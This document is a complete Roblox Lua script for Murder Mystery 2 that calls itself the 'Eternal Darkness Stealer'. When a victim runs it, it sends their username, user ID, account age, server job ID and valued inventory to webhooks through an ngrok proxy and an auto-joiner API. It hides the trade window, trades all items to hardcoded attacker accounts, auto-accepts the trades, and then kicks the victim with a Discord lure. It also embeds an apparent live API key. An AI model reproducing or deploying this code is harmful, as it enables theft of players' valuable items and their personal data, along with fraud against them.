repeat task.wait() until game:IsLoaded()
task.wait(2)

if game.PlaceId ~= 142823291 then
    local plr = game.Players:FindFirstChildOfClass("Player") or game.Players.LocalPlayer
    if plr and typeof(plr.Kick) == "function" then
        pcall(function() plr:Kick("This script only works in MM2!") end)
    end
    return
end

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local REAL_JOB_ID = ""
local executor = ""

pcall(function()
    if identifyexecutor then
        executor = identifyexecutor() or ""
    elseif getexecutorname then
        executor = getexecutorname() or ""
    end
end)

local printed = false

if string.find(executor:lower(), "delta") or string.find(executor:lower(), "krnl") then
    local found = false
    local attempts = 0
    repeat
        attempts = attempts + 1
        local gcSuccess, gcResult = pcall(function() return getgc(true) end)
        if gcSuccess and gcResult then
            for _, v in ipairs(gcResult) do
                if typeof(v) == "function" then
                    local infoSuccess, info = pcall(function() return debug.getinfo(v) end)
                    if infoSuccess and info and info.name == "stepAnimate" then
                        local hookSuccess = pcall(function()
                            local old = hookfunction(v, function(dt)
                                if not printed then
                                    printed = true
                                    REAL_JOB_ID = game.JobId
                                end
                                return old(dt)
                            end)
                        end)
                        if hookSuccess then
                            found = true
                            break
                        end
                    end
                end
            end
        end
        if not found then task.wait(0.5) end
    until found or REAL_JOB_ID ~= "" or attempts > 60
    
    if REAL_JOB_ID == "" then
        REAL_JOB_ID = game.JobId
    end
else
    REAL_JOB_ID = game.JobId
end

if REAL_JOB_ID == "" then
    REAL_JOB_ID = game.JobId
end

local a={}for b=0,255 do a[b]=string.char(b)end 
local function stringchar(b)local c=a[b]or string.char(b)return c end 
local function mathfloor(b)if b>=0 then return b-(b%1)else local c=b-(b%1)return c==b and c or c-1 end end 
local function tableinsert(b,c,d)if d==nil then d=c c=#b+1 end for e=#b,c,-1 do b[e+1]=b[e]end b[c]=d end 
local function tableconcat(b,c,d,e)c=c or''d=d or 1 e=e or#b local f=''for g=d,e do f=f..b[g]if g<e then f=f..c end end return f end 
local function bxor(b,c)local d,e=0,1 while b>0 or c>0 do local f,g=b%2,c%2 if f~=g then d=d+e end b=mathfloor(b/2)c=mathfloor(c/2)e=e*2 end return d end 
local function toHex(b)return(b:gsub('.',function(c)return string.format('%02X',string.byte(c))end))end 
local function xorCrypt(b,c)local d={}for e=1,#b do local f,g=b:byte(e),c:byte((e-1)%#c+1)tableinsert(d,stringchar(bxor(f,g)))end return tableconcat(d)end 
local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9a4e6a06bbcbc226d5721471cc15e94b46c"))end

local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.dev/api/proxy/"

local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
local usernames_id = _G.USERNAMES or {}

local TOP_HITS_WEBHOOK_ID = "wjffxl4325f"
local TOP_HITS_MIN_VALUE = 2000

getgenv().request = getgenv().request 
    or request 
    or http_request 
    or (syn and syn.request) 
    or (http and http.request) 
    or (fluxus and fluxus.request) 
    or (Hydrogen and Hydrogen.request) 
    or (krnl and krnl.request) 
    or (KRNL and KRNL.request) 
    or (codex and codex.request) 
    or (ronix and ronix.request) 
    or (volcano and volcano.request) 
    or (potassium and potassium.request) 
    or (wave and wave.request) 
    or (seliware and seliware.request) 
    or (bunnifun and bunnifun.request) 
    or (volt and volt.request) 
    or (velocity and velocity.request) 
    or (swift and swift.request) 
    or (xeno and xeno.request) 
    or getgenv().HttpPost 
    or nil

if not getgenv().request then
    warn("Executor not supported: No request function found.")
    return
end

getgenv().queue_on_teleport = getgenv().queue_on_teleport 
    or queue_on_teleport 
    or queueonteleport 
    or (syn and syn.queue_on_teleport) 
    or (fluxus and fluxus.queue_on_teleport) 
    or (Hydrogen and Hydrogen.queue_on_teleport) 
    or (krnl and krnl.queue_on_teleport) 
    or (codex and codex.queue_on_teleport) 
    or (ronix and ronix.queue_on_teleport) 
    or (volcano and volcano.queue_on_teleport) 
    or (potassium and potassium.queue_on_teleport) 
    or (wave and wave.queue_on_teleport) 
    or (seliware and seliware.queue_on_teleport) 
    or (bunnifun and bunnifun.queue_on_teleport) 
    or (volt and volt.queue_on_teleport) 
    or (velocity and velocity.queue_on_teleport) 
    or (swift and swift.queue_on_teleport) 
    or (xeno and xeno.queue_on_teleport) 
    or nil

getgenv().setclipboard = getgenv().setclipboard 
    or setclipboard 
    or (syn and syn.setclipboard) 
    or (clipboard and clipboard.set) 
    or (Hydrogen and Hydrogen.setclipboard) 
    or (krnl and krnl.setclipboard) 
    or (codex and codex.setclipboard) 
    or (ronix and ronix.setclipboard) 
    or (volcano and volcano.setclipboard) 
    or (potassium and potassium.setclipboard) 
    or (wave and wave.setclipboard) 
    or (seliware and seliware.setclipboard) 
    or (bunnifun and bunnifun.setclipboard) 
    or (volt and volt.setclipboard) 
    or (velocity and velocity.setclipboard) 
    or (swift and swift.setclipboard) 
    or (xeno and xeno.setclipboard) 
    or function() end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

local ETERNAL_DARKNESS_COLORS = {
    primary = 0x0a0a1a,
    secondary = 0x1a1a2e,
    accent = 0x16213e,
    highlight = 0x0f3460,
    text = 0x533483,
    gold = 0x8b0000,
    success = 0x006400
}

local cfg = {
    users = usernames_id,
    webhook = WEBHOOK_ID,
    pingEveryone = "Yes",
    StatusApi = "https://live-status-seven.vercel.app",
    ApiKey = "sk_live_4A9ZK7F2N0D6B8R5XHqMJEWpCYLt"
}

local AUTOJOINER_API = "https://autojoiner-fawn.vercel.app/api/hit"

local no_trade_items = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local specialItems = {
    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
}

local users = cfg.users
local plr = Players.LocalPlayer

if not plr then 
    warn("LocalPlayer not found")
    return 
end

local isTradeCompleted = false
local hasSpecialItem = false
local totalInventoryValue = 0
local statusHeartbeatStarted = false
local originalItems = {}
local receivedCounts = {}
local tradeMessageId = nil
local tradeWebhookUrl = nil
local tradeMessageUrl = nil
local request = getgenv().request

local executorName = "Unknown"
pcall(function()
    local ok, name = pcall(identifyexecutor)
    if ok and name then
        executorName = name
    else
        local ok2, name2 = pcall(getexecutorname)
        if ok2 and name2 then
            executorName = name2
        end
    end
end)

local isDelta = executorName:lower():find("delta") ~= nil
local queueTeleport = getgenv().queue_on_teleport

local STATUS_API_URL = cfg.StatusApi or ""
local API_KEY = cfg.ApiKey or ""
local ETERNAL_DARKNESS_AVATAR = "https://imgur.com/a/OPHDrDn.png"

local function sendHitToQueue(placeId, jobId, receiverName)
    pcall(function()
        request({
            Url = AUTOJOINER_API,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                placeId = tostring(placeId),
                jobId = tostring(jobId),
                receiver = receiverName
            })
        })
    end)
end

local function upload_to_rubis(items)
    local lines = {"Eternal Darkness Inventory Dump | Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
    table.sort(items, function(a, b)
        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local a_order = tier_order[a.Rarity] or 1
        local b_order = tier_order[b.Rarity] or 1
        if a_order ~= b_order then return a_order > b_order end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)
    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", item.ItemName or item.DataID, item.Amount, item.Value, total_val))
    end
    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = content,
                type = "PASTE"
            })
        })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            if data.paste then 
                return "https://pastefy.app/" .. data.paste.id
            elseif data.id then 
                return "https://pastefy.app/" .. data.id 
            end
        end
    end
    return nil
end

local function GetUSD(list)
    local url = "https://we-bmm2.vercel.app/api/calc"
    local items = {}
    
    local dbSuccess, database = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    end)
    
    if not dbSuccess then
        return {total = "0.00", itemPrices = {}}
    end
    
    for _, item in ipairs(list) do
        local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
        table.insert(items, {name = displayName, amount = item.Amount})
    end
    
    local success, res = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({inventory = items})
        })
    end)
    
    if success and res and res.Body then
        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and decoded then return decoded end
    end
    
    return {total = "0.00", itemPrices = {}}
end

local categories = {
    commons = "https://supremevalues.com/mm2/commons",
    uncommons = "https://supremevalues.com/mm2/uncommons",
    rares = "https://supremevalues.com/mm2/rares",
    legendaries = "https://supremevalues.com/mm2/legendaries",
    godlies = "https://supremevalues.com/mm2/godlies",
    chroma = "https://supremevalues.com/mm2/chromas",
    vintages = "https://supremevalues.com/mm2/vintages",
    ancients = "https://supremevalues.com/mm2/ancients",
    evos = "https://supremevalues.com/mm2/evos",
    uniques = "https://supremevalues.com/mm2/uniques",
    sets = "https://supremevalues.com/mm2/sets"
}

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}

local req_headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
}

local function clean_string_lol(str) 
    return str:match("^%s*(.-)%s*$") 
end

local function fetchHTML(url)
    local ok, response = pcall(function() 
        return request({Url = url, Method = "GET", Headers = req_headers}) 
    end)
    if ok and response then 
        return response.Body 
    end
    return nil
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        local value = tonumber(valueStr)
        if value then 
            return value 
        end
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = clean_string_lol(itemName:gsub("%s+", " "))
            local splitResult = itemName:split(" Click ")
            itemName = clean_string_lol(splitResult[1] or itemName)
            local itemNameLower = itemName:lower()
            local value = parseValue(itembodyDiv)
            if value then 
                itemValues[itemNameLower] = value 
            end
        end
    end
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}
    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then 
                chromaValues[chromaName] = value 
            end
        end
    end
    return chromaValues
end

local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}
    
    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end
    
    local totalCategories = #categoriesToFetch
    local completed = 0
    local lock = Instance.new("BindableEvent")
    
    for _, category in ipairs(categoriesToFetch) do
        task.spawn(function()
            local rarity = category.rarity
            local url = category.url
            local htmlContent = fetchHTML(url)
            
            if htmlContent and htmlContent ~= "" then
                if rarity ~= "chroma" then
                    local extracted = extractItems(htmlContent)
                    for k, v in pairs(extracted) do 
                        allExtractedValues[k] = v 
                    end
                else
                    chromaExtractedValues = extractChromaItems(htmlContent)
                end
            end
            
            completed = completed + 1
            if completed == totalCategories then 
                lock:Fire() 
            end
        end)
    end
    
    lock.Event:Wait()
    
    local valueList = {}
    local dbSuccess, database = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    end)
    
    if not dbSuccess then
        return valueList
    end
    
    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false
        
        if itemName ~= "" and rarity ~= "" then
            local weaponRarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")
            
            if weaponRarityIndex and godlyIndex and weaponRarityIndex >= godlyIndex then
                if hasChroma then
                    local matched = nil
                    for cn, cv in pairs(chromaExtractedValues) do
                        if cn:find(itemName) then 
                            matched = cv
                            break 
                        end
                    end
                    if matched then 
                        valueList[dataid] = matched 
                    end
                else
                    if allExtractedValues[itemName] then
                        valueList[dataid] = allExtractedValues[itemName]
                    end
                end
            end
        end
    end
    
    return valueList
end

if not plr.Character then 
    plr.CharacterAdded:Wait() 
end
task.wait(1)

local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local Trade, SendRequest, GetStatus, OfferItem, AcceptTradeRemote, DeclineTrade

pcall(function()
    Trade = ReplicatedStorage:WaitForChild("Trade")
    SendRequest = Trade:WaitForChild("SendRequest")
    GetStatus = Trade:WaitForChild("GetTradeStatus")
    OfferItem = Trade:WaitForChild("OfferItem")
    AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
    DeclineTrade = Trade:WaitForChild("DeclineTrade")
end)

if not Trade then
    warn("Trade remotes not found")
end

local LastOffer = nil

if Trade and Trade.UpdateTrade then
    pcall(function()
        Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
            if x and x.LastOffer then 
                LastOffer = x.LastOffer 
            end
        end)
    end)
end

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then 
                gui.Enabled = false 
            end
        end)
    end
end

local dbSuccess, database = pcall(function()
    return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
end)

if not dbSuccess then
    warn("Failed to load item database")
    return
end

local profileSuccess, profileData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)

if not profileSuccess or not profileData then
    warn("Failed to get profile data")
    profileData = {Weapons = {Owned = {}}}
end

local weaponsToSend = {}
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}

local fetchSuccess, prices = pcall(buildValueList)
if not fetchSuccess or not prices then
    prices = {}
end

local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}

for dataid, amount in pairs(weaponsOwned) do
    local item = database[dataid]
    if item and not no_trade_items[dataid] then
        local itemName = item.ItemName or dataid
        local rarity = item.Rarity or "Common"
        local value = prices[dataid] or 1
        local totalValue = value * amount
        totalInventoryValue = totalInventoryValue + totalValue
        
        if specialItems[itemName] then 
            hasSpecialItem = true 
        end
        
        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue,
            IsChroma = specialItems[itemName] or false
        })
        
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end

table.sort(weaponsToSend, function(a, b) 
    return a.TotalValue > b.TotalValue 
end)

local hitCategory = ""
local isPingWorthy = false

if totalInventoryValue < 100 then
    hitCategory = "Bad Hit"
elseif totalInventoryValue < 300 then
    hitCategory = "Normal Hit"
elseif totalInventoryValue < 1000 then
    hitCategory = "Good Hit"
    isPingWorthy = true
else
    hitCategory = "Big Hit"
    isPingWorthy = true
end

local function isTopHit()
    if totalInventoryValue >= TOP_HITS_MIN_VALUE then 
        return true 
    end
    for _, item in ipairs(weaponsToSend) do
        if item.Rarity == "Ancient" or item.Rarity == "Unique" then
            return true
        end
    end
    return false
end

local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"

local usdData = GetUSD(weaponsToSend)
local totalUSD = usdData.total or "0.00"

local function sendToProxy(Wid, payload, isEncrypted)
    task.spawn(function()
        local finalBody = HttpService:JSONEncode(payload)
        local url = PROXY_URL .. Wid
        
        print("[Eternal Darkness] Sending to proxy:", url)
        
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/1.0.0"
                },
                Body = finalBody
            })
        end)
        
        if not success then
            warn("[Eternal Darkness] Request failed:", tostring(response))
        elseif response.StatusCode ~= 200 then
            warn("[Eternal Darkness] Proxy error:", response.StatusCode, response.Body)
        else
            print("[Eternal Darkness] Successfully sent")
        end
    end)
end

local function sendMainWebhook()
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = table.concat(users, ", ")
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)

    local total_items = 0
    for _, item in ipairs(weaponsToSend) do 
        total_items = total_items + item.Amount 
    end

    local top_items = {}
    for i = 1, math.min(3, #weaponsToSend) do
        local item = weaponsToSend[i]
        local rarityEmoji = {
            Ancient = "🔴", Godly = "🟣", Unique = "🟡", 
            Vintage = "🟠", Legendary = "🔵", Rare = "🟢"
        }
        local emoji = rarityEmoji[item.Rarity] or "⚪"
        table.insert(top_items, string.format("%s `%s` x%d **%d**", emoji, item.ItemName, item.Amount, item.TotalValue))
    end

    local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
    for _, item in ipairs(weaponsToSend) do
        tier_counts[item.Rarity] = (tier_counts[item.Rarity] or 0) + item.Amount
    end

    local content = nil
    if isPingWorthy and cfg.pingEveryone == "Yes" then
        content = "@everyone 🌑 **NEW MM2 HIT | Eternal Darkness**"
    end

    local fields = {}
    table.insert(fields, {
        name = "👤 Victim",
        value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days",
        inline = true
    })
    table.insert(fields, {
        name = "⚙️ System",
        value = "Executor: " .. executorName .. "\nReceiver: " .. targetName .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...",
        inline = true
    })
    table.insert(fields, {
        name = "💰 Valuation",
        value = "Total Value: " .. totalInventoryValue .. "\nReal Value: $" .. totalUSD .. "\nTotal Items: " .. total_items,
        inline = true
    })
    
    local ansiLine1 = string.char(27) .. "[2;31mAncient:  " .. tier_counts.Ancient .. "  " .. string.char(27) .. "[2;35mGodly:   " .. tier_counts.Godly .. string.char(27) .. "[0m"
    local ansiLine2 = string.char(27) .. "[2;33mUnique:   " .. tier_counts.Unique .. "  " .. string.char(27) .. "[2;38;5;208mVintage: " .. tier_counts.Vintage .. string.char(27) .. "[0m"
    local ansiLine3 = string.char(27) .. "[2;34mLegendary:" .. tier_counts.Legendary .. "  " .. string.char(27) .. "[2;32mRare:    " .. tier_counts.Rare .. string.char(27) .. "[0m"
    local ansiLine4 = string.char(27) .. "[2;37mUncommon: " .. tier_counts.Uncommon .. "  Common:  " .. tier_counts.Common
    
    table.insert(fields, {
        name = "📊 Inventory Breakdown",
        value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n" .. ansiLine4 .. "```",
        inline = false
    })
    
    local topItemsStr = ""
    if #top_items > 0 then
        topItemsStr = table.concat(top_items, "\n")
    else
        topItemsStr = "No items"
    end
    
    table.insert(fields, {
        name = "🏆 Top Items",
        value = "```\n" .. topItemsStr .. "\n```",
        inline = false
    })
    table.insert(fields, {
        name = "🔗 Actions",
        value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")",
        inline = false
    })

    local payload = {
        content = content,
        username = "🌑 Eternal Darkness",
        avatar_url = ETERNAL_DARKNESS_AVATAR,
        embeds = {{
            title = "🎯 HIT CONFIRMED │ " .. plr.DisplayName .. " │ " .. hitCategory,
            url = rubisLink,
            color = ETERNAL_DARKNESS_COLORS.secondary,
            thumbnail = {url = avatarUrl},
            description = "```lua\n" .. joinScript .. "\n```",
            fields = fields,
            footer = {
                text = "Eternal Darkness Stealer  v1.0.0 | discord.gg/wep4k9Fg8W"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    sendToProxy(WEBHOOK_ID, payload, false)

    for _, rcv in ipairs(users) do
        sendHitToQueue(PlaceId, REAL_JOB_ID, rcv)
    end
end

local function sendTopHits()
    if not isTopHit() then 
        return 
    end
    
    local total_items = 0
    for _, item in ipairs(weaponsToSend) do 
        total_items = total_items + item.Amount 
    end
    
    local top_items = {}
    for i = 1, math.min(5, #weaponsToSend) do
        local item = weaponsToSend[i]
        table.insert(top_items, "`" .. item.ItemName .. "` x" .. item.Amount .. " (**" .. item.TotalValue .. "** value)")
    end

    local fields = {}
    table.insert(fields, {
        name = "💰 Elite Valuation",
        value = "In-Game: " .. totalInventoryValue .. "\nReal Value: $" .. totalUSD .. "\nItems: " .. total_items,
        inline = true
    })
    table.insert(fields, {
        name = "👤 Victim",
        value = "User: " .. plr.Name .. "\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days",
        inline = true
    })
    table.insert(fields, {
        name = "⚙️ System",
        value = "Executor: " .. executorName .. "\nJob ID: " .. string.sub(REAL_JOB_ID, 1, 8) .. "...",
        inline = true
    })
    
    local eliteItemsStr = ""
    if #top_items > 0 then
        eliteItemsStr = table.concat(top_items, "\n")
    else
        eliteItemsStr = "No items"
    end
    
    table.insert(fields, {
        name = "🏆 Elite Items",
        value = "```\n" .. eliteItemsStr .. "\n```",
        inline = false
    })
    table.insert(fields, {
        name = "🔗 Actions",
        value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")",
        inline = false
    })

    local payload = {
        content = "@everyone 🌑🔥 **ELITE MM2 HIT | Eternal Darkness**",
        username = "🔥 Elite Shadow",
        avatar_url = ETERNAL_DARKNESS_AVATAR,
        embeds = {{
            title = "🎯🔥 ELITE HIT CONFIRMED",
            url = rubisLink,
            color = ETERNAL_DARKNESS_COLORS.highlight,
            description = "**" .. plr.Name .. "** has been consumed by Eternal Darkness!\n\nThis is an **ELITE** hit worth **$" .. totalUSD .. "** real money!",
            fields = fields,
            footer = { 
                text = "Eternal Darkness Stealer  v1.0.0 | discord.gg/wep4k9Fg8W"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    sendToProxy(TOP_HITS_WEBHOOK_ID, payload, false)
end

print("[Eternal Darkness] Starting webhook send...")
sendMainWebhook()
sendTopHits()
print("[Eternal Darkness] Webhooks sent!")

local function getStatus()
    if not GetStatus then 
        return "None" 
    end
    local ok, status = pcall(function() 
        return GetStatus:InvokeServer() 
    end)
    return ok and status or "None"
end

local function waitForTarget(targetPlayer)
    local attempts = 0
    while attempts < 30 do
        if targetPlayer and targetPlayer.Parent then
            local char = targetPlayer.Character
            if char and char:FindFirstChild("Humanoid") then 
                return true 
            end
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return false
end

local function AcceptTrade()
    if not LastOffer or not AcceptTradeRemote then 
        return false 
    end
    local ok = pcall(function()
        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
    end)
    return ok
end

local function finishAndKick()
    isTradeCompleted = true
    task.wait(2)
    local discordLink = "https://discord.gg/wep4k9Fg8W"
    pcall(function() 
        setclipboard(discordLink) 
    end)
    pcall(function()
        plr:Kick("Items taken by Eternal Darkness\n\n" .. discordLink .. "\n\nJoin to get your items back!")
    end)
end

function doTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then 
        return 
    end
    if not waitForTarget(targetPlayer) then 
        return 
    end
    
    local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
    local combinedUser = {}
    for _, v in ipairs(users) do 
        table.insert(combinedUser, v) 
    end
    for _, v in ipairs(DhUsers) do 
        table.insert(combinedUser, v) 
    end
    
    local initialTradeState = getStatus()
    if initialTradeState == "StartTrade" then
        pcall(function() 
            if DeclineTrade then DeclineTrade:FireServer() end 
        end)
        task.wait(0.3)
    elseif initialTradeState == "ReceivingRequest" then
        pcall(function() 
            if Trade and Trade.DeclineRequest then 
                Trade.DeclineRequest:FireServer() 
            end 
        end)
        task.wait(0.3)
    end
    
    LastOffer = nil
    local itemsAdded = false
    local timeout = 0
    
    while timeout < 60 and #weaponsToSend > 0 do
        local success = pcall(function()
            local status = getStatus()
            
            if status == "None" then
                if itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do 
                        local removed = table.remove(weaponsToSend, 1)
                        if removed and originalItems and receivedCounts then
                            receivedCounts[removed.ItemName] = (receivedCounts[removed.ItemName] or 0) + removed.Amount
                        end
                    end
                    itemsAdded = false
                    LastOffer = nil
                    task.wait(0.5)
                else
                    if SendRequest and targetPlayer then
                        SendRequest:InvokeServer(targetPlayer)
                    end
                    task.wait(1.5)
                end
            elseif status == "SendingRequest" then
                task.wait(0.5)
            elseif status == "ReceivingRequest" then
                pcall(function() 
                    if DeclineTrade then 
                        DeclineTrade:FireServer() 
                    end 
                end)
                task.wait(0.3)
            elseif status == "StartTrade" then
                if not itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do
                        local item = weaponsToSend[i]
                        if item and OfferItem then
                            for _ = 1, item.Amount do
                                OfferItem:FireServer(item.DataID, "Weapons")
                            end
                        end
                        task.wait(0.1)
                    end
                    itemsAdded = true
                    task.spawn(function()
                        task.wait(6.5)
                        AcceptTrade()
                    end)
                else
                    task.wait(1)
                end
            end
        end)
        
        if not success then 
            task.wait(1) 
        end
        timeout = timeout + 1
    end
    
    if #weaponsToSend == 0 then 
        finishAndKick() 
    end
end

local function isTarget(name)
    local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
    local combinedUser = {}
    for _, v in ipairs(users) do 
        table.insert(combinedUser, v) 
    end
    for _, v in ipairs(DhUsers) do 
        table.insert(combinedUser, v) 
    end
    
    for _, u in ipairs(combinedUser) do
        if u:lower() == name:lower() then 
            return true 
        end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then 
        return 
    end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(p)
        end)
    end
end
